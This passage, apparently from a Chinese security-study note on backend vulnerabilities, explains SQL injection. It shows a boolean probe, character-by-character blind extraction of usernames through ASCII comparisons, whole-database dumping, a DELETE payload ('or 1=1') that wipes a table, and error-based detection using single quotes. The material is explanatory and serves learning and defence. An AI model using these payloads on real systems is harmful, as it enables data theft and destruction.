start=\"3\"\u003e\n\u003cli\u003e布尔逻辑探测\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-SQL\" data-lang=\"SQL\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eselect\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003efrom\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003epost_log\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003ewhere\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eand\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e2和3的主要目的是通过对比网页返回的内容印证猜想，猜对和猜错分别会给出什么提示\n4. 发起攻击\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-SQL\" data-lang=\"SQL\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eselect\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003efrom\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003epost_log\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003ewhere\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eand\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003eselect\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eascii\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emid\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"k\"\u003efrom\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003euser\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003elimit\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"mi\"\u003e97\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e含义：数据库admin表中的username字段存储的第一条记录的第一个字母是什么，它的ASCII编码小于97吗？\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e主流SQL注入工具采用\u003ccode\u003e二分法\u003c/code\u003e，一般取中间64开始\u003c/li\u003e\n\u003cli\u003e在手动测试中，由于某些情况下已知该字段信息范围可能存储的是字母或数字，所以以97为入手点较多，因为97是小写字母a，其余小写字母\u0026gt;97，大写字母和数字\u0026lt;97；若是小写字母，则范围缩小到26个小写字母和四个特殊符号“{”（ASCII码123）；“|”（124）；“}”（125）；“~”（126）\n\u003cem\u003e以此方法批量获取数据库中所有的数据库名称、表名称、表结构和表中的数据\u003c/em\u003e -\u0026gt; \u003cem\u003e\u003cstrong\u003e拖库攻击\u003c/strong\u003e\u003c/em\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"2-edelete操作清空数据库\"\u003e2. “EDELETE操作”，清空数据库\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e某些网站经常会设计删除功能（eg删除评论、订单等），其实就是数据库的“DELETE操作”\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-SQL\" data-lang=\"SQL\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e#\u003c/span\u003e\u003cspan class=\"err\"\u003e正常删除\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003edelete\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003efrom\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003epost_log\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003ewhere\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e15543\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"o\"\u003e#\u003c/span\u003e\u003cspan class=\"err\"\u003e删除一条记录\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e#\u003c/span\u003e\u003cspan class=\"err\"\u003e攻击\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003edelete\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003efrom\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003epost_log\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003ewhere\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e15543\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eor\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"o\"\u003e#\u003c/span\u003e\u003cspan class=\"err\"\u003e删除整个表\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"sql注入检测方法与攻击方法\"\u003eSQL注入检测方法与攻击方法\u003c/h2\u003e\n\u003ch3 id=\"参考sql注入\"\u003e参考：[[SQL注入]]\u003c/h3\u003e\n\u003ch3 id=\"报错注入\"\u003e报错注入\u003c/h3\u003e\n\u003ch4 id=\"1-基于报错的sql注入检测方法\"\u003e1. 基于报错的SQL注入检测方法\u003c/h4\u003e\n\u003cp\u003e注入时尝试拼接单引号、反斜杠字符，例如“\u003ccode\u003eid = 1'\u003c/code\u003e” 通过观察是否报错，判断拼接的单引号是否起作用（单引号提前闭合，引起语法错误；原本正常的单引号被转义符打破，形成未闭合的语句）\u003c/p\u003e","title":"传统后端漏洞"}]